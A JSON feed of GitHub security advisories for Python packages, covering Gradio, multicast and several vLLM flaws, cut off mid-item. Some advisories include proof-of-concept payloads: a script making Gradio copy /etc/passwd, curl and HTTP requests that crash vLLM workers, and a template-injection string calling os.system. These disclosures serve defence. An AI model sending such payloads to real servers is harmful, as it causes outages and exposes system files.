{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://xlordz.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>An arbitrary file copy vulnerability in Gradio's flagging feature allows unauthenticated attackers to copy any readable file from the server's filesystem. While attackers can't read these copied files, they can cause DoS by copying large files (like /dev/urandom) to fill disk space.</p>\n<h3 id=\"description\">Description</h3>\n<p>The flagging component doesn't properly validate file paths before copying files. Attackers can send specially crafted requests to the <code>/gradio_api/run/predict</code> endpoint to trigger these file copies.</p>\n<p><strong>Source</strong>: User-controlled <code>path</code> parameter in the flagging functionality JSON payload<br><strong>Sink</strong>: <code>shutil.copy</code> operation in <code>FileData._copy_to_dir()</code> method</p>\n<p>The vulnerable code flow:</p>\n<ol>\n<li>A JSON payload is sent to the <code>/gradio_api/run/predict</code> endpoint</li>\n<li>The <code>path</code> field within <code>FileData</code> object can reference any file on the system</li>\n<li>When processing this request, the <code>Component.flag()</code> method creates a <code>GradioDataModel</code> object</li>\n<li>The <code>FileData._copy_to_dir()</code> method uses this path without proper validation:</li>\n</ol>\n<pre><code class=\"language-python\">def _copy_to_dir(self, dir: str) -&gt; FileData:\n    pathlib.Path(dir).mkdir(exist_ok=True)\n    new_obj = dict(self)\n\n    if not self.path:\n        raise ValueError(\"Source file path is not set\")\n    new_name = shutil.copy(self.path, dir)  # vulnerable sink\n    new_obj[\"path\"] = new_name\n    return self.__class__(**new_obj)\n</code></pre>\n<ol start=\"5\">\n<li>The lack of validation allows copying any file the Gradio process can read</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p>The following script demonstrates the vulnerability by copying <code>/etc/passwd</code> from the server to Gradio's flagged directory:</p>\n<p>Setup a Gradio app:</p>\n<pre><code class=\"language-python\">import gradio as gr\n\ndef image_classifier(inp):\n    return {'cat': 0.2, 'dog': 0.8}\n\ntest = gr.Interface(fn=image_classifier, inputs=\"image\", outputs=\"label\")\n\ntest.launch(share=True)\n</code></pre>\n<p>Run the PoC:</p>\n<pre><code class=\"language-python\">import requests\n\nurl = \"https://[your-gradio-app-url]/gradio_api/run/predict\"  \nheaders = {\n    \"Content-Type\": \"application/json\",  \n    \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\" \n}\n\npayload = {\n    \"data\": [\n        {\n            \"path\": \"/etc/passwd\",  \n            \"url\": \"[your-gradio-app-url]\",\n            \"orig_name\": \"network_config\", \n            \"size\": 5000,  \n            \"mime_type\": \"text/plain\", \n            \"meta\": {\n                \"_type\": \"gradio.FileData\"  \n            }\n        },\n        {}  \n    ],\n    \"event_data\": None,\n    \"fn_index\": 4, \n    \"trigger_id\": 11, \n    \"session_hash\": \"test123\"  \n}\n\nresponse = requests.post(url, headers=headers, json=payload)\nprint(f\"Status Code: {response.status_code}\")\nprint(f\"Response Body: {response.text}\")\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gradio-app/gradio/security/advisories/GHSA-8jw3-6x8j-v96g\">https://github.com/gradio-app/gradio/security/advisories/GHSA-8jw3-6x8j-v96g</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8jw3-6x8j-v96g\">https://github.com/advisories/GHSA-8jw3-6x8j-v96g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8jw3-6x8j-v96g",
            "title": "[gradio] Gradio Allows Unauthorized File Copy via Path Manipulation",
            "date_modified": "2025-05-29T22:37:03.000Z",
            "date_published": "2025-05-29T22:36:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8jw3-6x8j-v96g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>Some source-builds may be impacted by a CWE-1395 (eg. vulnerable <code>setuptools</code> dependency).<ul>\n<li>Multicast prior to v2.0.9a3 on systems with minimal dependancies installed may use <code>setuptools &lt;78.1.1</code> and thus rely on a compromised dependency. In some cases there is a chance that source-builds would fail due to an exploit of the closely related CVE-2025-47273, or become arbitrarily modified.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>Pre-release version v2.0.9a0 and later resolve the issue by bumping requirements to <code>setuptools&gt;=80.4</code><ul>\n<li>Pre-release version v2.0.9a3 and later are recommended for improved stability over v2.0.9a0</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Further hardening in v2.0.9a4+ of the build process in CI builds allowing source builds to be verified via GH attestations.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf\">GHSA-5rjg-fvgr-3xxf</a></li>\n<li>pypa/setuptools#4946</li>\n</ul>\n<h3 id=\"fixes\">Fixes</h3>\n<ul>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf\">https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/security/advisories/GHSA-94v7-wxj6-r2q5\">https://github.com/reactive-firewall/multicast/security/advisories/GHSA-94v7-wxj6-r2q5</a></li>\n<li><a href=\"https://github.com/pypa/setuptools/issues/4946\">https://github.com/pypa/setuptools/issues/4946</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/commit/c5c7c7de272421d944beca8452871bca6bfd151f\">https://github.com/reactive-firewall/multicast/commit/c5c7c7de272421d944beca8452871bca6bfd151f</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/docs/requirements.txt#L27</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/pyproject.toml#L2</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/requirements.txt#L26</a></li>\n<li><a href=\"https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32\">https://github.com/reactive-firewall/multicast/blob/c5c7c7de272421d944beca8452871bca6bfd151f/tests/requirements.txt#L32</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-94v7-wxj6-r2q5\">https://github.com/advisories/GHSA-94v7-wxj6-r2q5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-94v7-wxj6-r2q5",
            "title": "[multicast] multicast in source builds from vulnerable setuptools dependency",
            "date_modified": "2025-05-28T21:07:06.000Z",
            "date_published": "2025-05-28T21:07:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-94v7-wxj6-r2q5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The vLLM backend used with the /v1/chat/completions OpenAPI endpoint fails to validate unexpected or malformed input in the \"pattern\" and \"type\" fields when the tools functionality is invoked. These inputs are not validated before being compiled or parsed, causing a crash of the inference worker with a single request. The worker will remain down until it is restarted. </p>\n<h3 id=\"details\">Details</h3>\n<p>The \"type\" field is expected to be one of: \"string\", \"number\", \"object\", \"boolean\", \"array\", or \"null\". Supplying any other value will cause the worker to crash with the following error:</p>\n<p>RuntimeError: [11:03:34] /project/cpp/json_schema_converter.cc:637: Unsupported type \"something_or_nothing\"</p>\n<p>The \"pattern\" field undergoes Jinja2 rendering (I think) prior to being passed unsafely into the native regex compiler without validation or escaping. This allows malformed expressions to reach the underlying C++ regex engine, resulting in fatal errors.</p>\n<p>For example, the following inputs will crash the worker:</p>\n<p>Unclosed {, [, or (</p>\n<p>Closed:{} and []</p>\n<p>Here are some of runtime errors on the crash depending on what gets injected:</p>\n<p>RuntimeError: [12:05:04] /project/cpp/regex_converter.cc:73: Regex parsing error at position 4: The parenthesis is not closed.\nRuntimeError: [10:52:27] /project/cpp/regex_converter.cc:73: Regex parsing error at position 2: Invalid repetition count.\nRuntimeError: [12:07:18] /project/cpp/regex_converter.cc:73: Regex parsing error at position 6: Two consecutive repetition modifiers are not allowed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Here is the POST request using the type field to crash the worker. Note the type field is set to \"something\" rather than the expected types it is looking for:\nPOST /v1/chat/completions HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: \nContent-Type: application/json\nContent-Length: 579\nOrigin: \nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\nTe: trailers\nConnection: keep-alive</p>\n<p>{\n  \"model\": \"mistral-nemo-instruct\",\n  \"messages\": [{ \"role\": \"user\", \"content\": \"crash via type\" }],\n  \"tools\": [\n    {\n      \"type\": \"function\",\n      \"function\": {\n        \"name\": \"crash01\",\n        \"parameters\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"a\": {\n              \"type\": \"something\"\n            }\n          }\n        }\n      }\n    }\n  ],\n  \"tool_choice\": {\n    \"type\": \"function\",\n    \"function\": {\n      \"name\": \"crash01\",\n      \"arguments\": { \"a\": \"test\" }\n    }\n  },\n  \"stream\": false,\n  \"max_tokens\": 1\n}</p>\n<p>Here is the POST request using the pattern field to crash the worker. Note the pattern field is set to a RCE payload, it could have just been set to {{}}. I was not able to get RCE in my testing, but is does crash the worker.</p>\n<p>POST /v1/chat/completions HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: \nContent-Type: application/json\nContent-Length: 718\nOrigin: \nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\nTe: trailers\nConnection: keep-alive</p>\n<p>{\n  \"model\": \"mistral-nemo-instruct\",\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": \"Crash via Pattern\"\n    }\n  ],\n  \"tools\": [\n    {\n      \"type\": \"function\",\n      \"function\": {\n        \"name\": \"crash02\",\n        \"parameters\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"a\": {\n              \"type\": \"string\",\n\"pattern\": \"{{ <strong>import</strong>('os').system('echo RCE_OK &gt; /tmp/pwned') or 'SAFE' }}\"\n            }\n          }\n        }\n      }\n    }\n  ],\n  \"tool_choice\": {\n    \"type\": \"function\",\n    \"function\": {\n      \"name\": \"crash02\"\n    }\n  },\n  \"stream\": false,\n  \"max_tokens\": 32,\n  \"temperature\": 0.2,\n  \"top_p\": 1,\n  \"n\": 1\n}</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Backend workers can be crashed causing anyone to using the inference engine to get 500 internal server errors on subsequent requests. </p>\n<h3 id=\"fix\">Fix</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17623\">https://github.com/vllm-project/vllm/pull/17623</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65\">https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17623\">https://github.com/vllm-project/vllm/pull/17623</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vrq3-r879-7m65\">https://github.com/advisories/GHSA-vrq3-r879-7m65</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vrq3-r879-7m65",
            "title": "[vllm] vLLM Tool Schema allows DoS via Malformed pattern and type Fields",
            "date_modified": "2025-05-29T21:31:37.000Z",
            "date_published": "2025-05-28T19:42:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vrq3-r879-7m65"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A denial of service bug caused the vLLM server to crash if an invalid regex was provided while using structured output. This vulnerability is similar to <a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg\">GHSA-6qc9-v4r8-22xg</a>, but for regex instead of a JSON schema.</p>\n<p>Issue with more details: <a href=\"https://github.com/vllm-project/vllm/issues/17313\">https://github.com/vllm-project/vllm/issues/17313</a></p>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17623\">https://github.com/vllm-project/vllm/pull/17623</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-9hcf-v7m4-6m2j\">https://github.com/vllm-project/vllm/security/advisories/GHSA-9hcf-v7m4-6m2j</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/issues/17313\">https://github.com/vllm-project/vllm/issues/17313</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17623\">https://github.com/vllm-project/vllm/pull/17623</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff\">https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9hcf-v7m4-6m2j\">https://github.com/advisories/GHSA-9hcf-v7m4-6m2j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9hcf-v7m4-6m2j",
            "title": "[vllm] vLLM allows clients to crash the openai server with invalid regex",
            "date_modified": "2025-05-29T21:20:17.000Z",
            "date_published": "2025-05-28T19:42:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9hcf-v7m4-6m2j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Hitting the  /v1/completions API with a invalid json_schema as a Guided Param will kill the vllm server</p>\n<h3 id=\"details\">Details</h3>\n<p>The following API call \n<code>(venv) [derekh@ip-172-31-15-108 ]$ curl -s http://localhost:8000/v1/completions -H \"Content-Type: application/json\" -d '{\"model\": \"meta-llama/Llama-3.2-3B-Instruct\",\"prompt\": \"Name two great reasons to visit Sligo \", \"max_tokens\": 10, \"temperature\": 0.5, \"guided_json\":\"{\\\"properties\\\":{\\\"reason\\\":{\\\"type\\\": \\\"stsring\\\"}}}\"}'    </code>\nwill provoke a Uncaught exceptions from xgrammer in \n<code>./lib64/python3.11/site-packages/xgrammar/compiler.py </code></p>\n<p>Issue with more information: <a href=\"https://github.com/vllm-project/vllm/issues/17248\">https://github.com/vllm-project/vllm/issues/17248</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Make a call to vllm with invalid json_scema e.g. <code>{\\\"properties\\\":{\\\"reason\\\":{\\\"type\\\": \\\"stsring\\\"}}}</code></p>\n<p><code>curl -s http://localhost:8000/v1/completions -H \"Content-Type: application/json\" -d '{\"model\": \"meta-llama/Llama-3.2-3B-Instruct\",\"prompt\": \"Name two great reasons to visit Sligo \", \"max_tokens\": 10, \"temperature\": 0.5, \"guided_json\":\"{\\\"properties\\\":{\\\"reason\\\":{\\\"type\\\": \\\"stsring\\\"}}}\"}' </code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>vllm crashes</p>\n<p>example traceback</p>\n<pre><code>ERROR 03-26 17:25:01 [core.py:340] EngineCore hit an exception: Traceback (most recent call last):\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/engine/core.py\", line 333, in run_engine_core\nERROR 03-26 17:25:01 [core.py:340]     engine_core.run_busy_loop()\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/engine/core.py\", line 367, in run_busy_loop\nERROR 03-26 17:25:01 [core.py:340]     outputs = step_fn()\nERROR 03-26 17:25:01 [core.py:340]               ^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/engine/core.py\", line 181, in step\nERROR 03-26 17:25:01 [core.py:340]     scheduler_output = self.scheduler.schedule()\nERROR 03-26 17:25:01 [core.py:340]                        ^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/core/scheduler.py\", line 257, in schedule\nERROR 03-26 17:25:01 [core.py:340]     if structured_output_req and structured_output_req.grammar:\nERROR 03-26 17:25:01 [core.py:340]                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py\", line 41, in grammar\nERROR 03-26 17:25:01 [core.py:340]     completed = self._check_grammar_completion()\nERROR 03-26 17:25:01 [core.py:340]                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py\", line 29, in _check_grammar_completion\nERROR 03-26 17:25:01 [core.py:340]     self._grammar = self._grammar.result(timeout=0.0001)\nERROR 03-26 17:25:01 [core.py:340]                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/usr/lib64/python3.11/concurrent/futures/_base.py\", line 456, in result\nERROR 03-26 17:25:01 [core.py:340]     return self.__get_result()\nERROR 03-26 17:25:01 [core.py:340]            ^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/usr/lib64/python3.11/concurrent/futures/_base.py\", line 401, in __get_result\nERROR 03-26 17:25:01 [core.py:340]     raise self._exception\nERROR 03-26 17:25:01 [core.py:340]   File \"/usr/lib64/python3.11/concurrent/futures/thread.py\", line 58, in run\nERROR 03-26 17:25:01 [core.py:340]     result = self.fn(*self.args, **self.kwargs)\nERROR 03-26 17:25:01 [core.py:340]              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/structured_output/__init__.py\", line 120, in _async_create_grammar\nERROR 03-26 17:25:01 [core.py:340]     ctx = self.compiler.compile_json_schema(grammar_spec,\nERROR 03-26 17:25:01 [core.py:340]           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/venv/lib64/python3.11/site-packages/xgrammar/compiler.py\", line 101, in compile_json_schema\nERROR 03-26 17:25:01 [core.py:340]     self._handle.compile_json_schema(\nERROR 03-26 17:25:01 [core.py:340] RuntimeError: [17:25:01] /project/cpp/json_schema_converter.cc:795: Check failed: (schema.is&lt;picojson::object&gt;()) is false: Schema should be an object or bool\nERROR 03-26 17:25:01 [core.py:340] \nERROR 03-26 17:25:01 [core.py:340] \nCRITICAL 03-26 17:25:01 [core_client.py:269] Got fatal signal from worker processes, shutting down. See stack trace above for root cause issue.\n</code></pre>\n<h3 id=\"fix\">Fix</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17623\">https://github.com/vllm-project/vllm/pull/17623</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg\">https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/issues/17248\">https://github.com/vllm-project/vllm/issues/17248</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17623\">https://github.com/vllm-project/vllm/pull/17623</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff\">https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qc9-v4r8-22xg\">https://github.com/advisories/GHSA-6qc9-v4r8-22xg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qc9-v4r8-22xg",
            "title": "[vllm] vLLM DOS: Remotely kill vllm over http with invalid JSON schema",
            "date_modified": "2025-05-29T21:20:10.000Z",
            "date_published": "2025-05-28T19:41:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qc9-v4r8-22xg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In the file <code>vllm/multimodal/hasher.py</code>, the <code>MultiModalHasher</code> class has a security and data integrity issue in its image hashing method. Currently, it serializes <code>PIL.Image.Image</code> objects using only <code>obj.tobytes()</code>, which returns only the raw pixel data, without including metadata such as the image’s shape (width, height, mode). As a result, two images of different sizes (e.g., 30x100 and 100x30) with the same pixel byte sequence could generate the same hash value. This may lead to hash collisions, incorrect cache hits, and even data leakage or security risks.</p>\n<h2 id=\"details\">Details</h2>\n<ul>\n<li><strong>Affected file:</strong> <code>vllm/multimodal/hasher.py</code></li>\n<li><strong>Affected method:</strong> <code>MultiModalHasher.serialize_item</code>\n<a href=\"https://github.com/vllm-project/vllm/blob/9420a1fc30af1a632bbc2c66eb8668f3af41f026/vllm/multimodal/hasher.py#L34-L35\">https://github.com/vllm-project/vllm/blob/9420a1fc30af1a632bbc2c66eb8668f3af41f026/vllm/multimodal/hasher.py#L34-L35</a></li>\n<li><strong>Current behavior:</strong> For <code>Image.Image</code> instances, only <code>obj.tobytes()</code> is used for hashing.</li>\n<li><strong>Problem description:</strong> <code>obj.tobytes()</code> does not include the image’s width, height, or mode metadata.</li>\n<li><strong>Impact:</strong> Two images with the same pixel byte sequence but different sizes could be regarded as the same image by the cache and hashing system, which may result in:<ul>\n<li>Incorrect cache hits, leading to abnormal responses</li>\n<li>Deliberate construction of images with different meanings but the same hash value</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"recommendation\">Recommendation</h2>\n<p>In the <code>serialize_item</code> method, <strong>serialization of <code>Image.Image</code> objects should include not only pixel data, but also all critical metadata</strong>—such as dimensions (<code>size</code>), color mode (<code>mode</code>), format, and especially the <code>info</code> dictionary. The <code>info</code> dictionary is particularly important in palette-based images (e.g., mode <code>'P'</code>), where the palette itself is stored in <code>info</code>. Ignoring <code>info</code> can result in hash collisions between visually distinct images with the same pixel bytes but different palettes or metadata. This can lead to incorrect cache hits or even data leakage.</p>\n<p><strong>Summary:</strong><br>Serializing only the raw pixel data is insecure. Always include all image metadata (<code>size</code>, <code>mode</code>, <code>format</code>, <code>info</code>) in the hash calculation to prevent collisions, especially in cases like palette-based images.</p>\n<p><strong>Impact for other modalities</strong>\nFor the influence of other modalities, since the video modality is transformed into a multi-dimensional array containing the length, width, time, etc. of the video, the same problem exists due to the incorrect sequence of numpy as well.</p>\n<p>For audio, since the momo function is not enabled in librosa.load, the loaded audio is automatically encoded into single channels by librosa and returns a one-dimensional array of numpy, thus keeping the structure of numpy fixed and not affected by this issue.</p>\n<h2 id=\"fixes\">Fixes</h2>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17378\">https://github.com/vllm-project/vllm/pull/17378</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-c65p-x677-fgj6\">https://github.com/vllm-project/vllm/security/advisories/GHSA-c65p-x677-fgj6</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17378\">https://github.com/vllm-project/vllm/pull/17378</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/99404f53c72965b41558aceb1bc2380875f5d848\">https://github.com/vllm-project/vllm/commit/99404f53c72965b41558aceb1bc2380875f5d848</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-46722\">https://nvd.nist.gov/vuln/detail/CVE-2025-46722</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2025-43.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2025-43.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c65p-x677-fgj6\">https://github.com/advisories/GHSA-c65p-x677-fgj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c65p-x677-fgj6",
            "title": "[vllm] vLLM has a Weakness in MultiModalHasher Image Hashing Implementation",
            "date_modified": "2025-05-29T21:36:28.000Z",
            "date_published": "2025-05-28T18:03:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c65p-x677-fgj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>This issue arises from the prefix caching mechanism, which may expose the system to a timing side-channel attack.</p>\n<h2 id=\"description\">Description</h2>\n<p>When a new prompt is processed, if the PageAttention mechanism finds a matching prefix chunk, the prefill process speeds up, which is reflected in the TTFT (Time to First Token). Our tests revealed that the timing differences caused by matching chunks are significant enough to be recognized and exploited.</p>\n<p>For instance, if the victim has submitted a sensitive prompt or if a valuable system prompt has been cached, an attacker sharing the same backend could attempt to guess the victim's input. By measuring the TTFT based on prefix matches, the attacker could verify if their guess is correct, leading to potential leakage of private information.</p>\n<p>Unlike token-by-token sharing mechanisms, vLLM’s chunk-based approach (PageAttention) processes tokens in larger units (chunks). In our tests, with chunk_size=2, the timing differences became noticeable enough to allow attackers to infer whether portions of their input match the victim's prompt at the chunk level.</p>\n<h2 id=\"environment\">Environment</h2>\n<ul>\n<li>GPU: NVIDIA A100 (40G)</li>\n<li>CUDA: 11.8</li>\n<li>PyTorch: 2.3.1</li>\n<li>OS: Ubuntu 18.04</li>\n<li>vLLM: v0.5.1\nConfiguration: We launched vLLM using the default settings and adjusted chunk_size=2 to evaluate the TTFT.</li>\n</ul>\n<h2 id=\"leakage\">Leakage</h2>\n<p>We conducted our tests using LLaMA2-70B-GPTQ on a single device. We analyzed the timing differences when prompts shared prefixes of 2 chunks, and plotted the corresponding ROC curves. Our results suggest that timing differences can be reliably used to distinguish prefix matches, demonstrating a potential side-channel vulnerability.\n<img width=\"400\" alt=\"roc_curves_combined_block_2\" src=\"https://github.com/user-attachments/assets/db3491e9-02b7-424c-9b6d-56f553b39f2f\"></p>\n<h2 id=\"results\">Results</h2>\n<p>In our experiment, we analyzed the response time differences between cache hits and misses in vLLM's PageAttention mechanism. Using ROC curve analysis to assess the distinguishability of these timing differences, we observed the following results:</p>\n<ul>\n<li>With a 1-token prefix, the ROC curve yielded an AUC value of 0.571, indicating that even with a short prefix, an attacker can reasonably distinguish between cache hits and misses based on response times.</li>\n<li>When the prefix length increases to 8 tokens, the AUC value rises significantly to 0.99, showing that the attacker can almost perfectly identify cache hits with a longer prefix.</li>\n</ul>\n<h2 id=\"fixes\">Fixes</h2>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17045\">https://github.com/vllm-project/vllm/pull/17045</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-4qjh-9fv9-r85r\">https://github.com/vllm-project/vllm/security/advisories/GHSA-4qjh-9fv9-r85r</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/17045\">https://github.com/vllm-project/vllm/pull/17045</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/77073c77bc2006eb80ea6d5128f076f5e6c6f54f\">https://github.com/vllm-project/vllm/commit/77073c77bc2006eb80ea6d5128f076f5e6c6f54f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-46570\">https://nvd.nist.gov/vuln/detail/CVE-2025-46570</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4qjh-9fv9-r85r\">https://github.com/advisories/GHSA-4qjh-9fv9-r85r</a></li>\n</ul>\n",
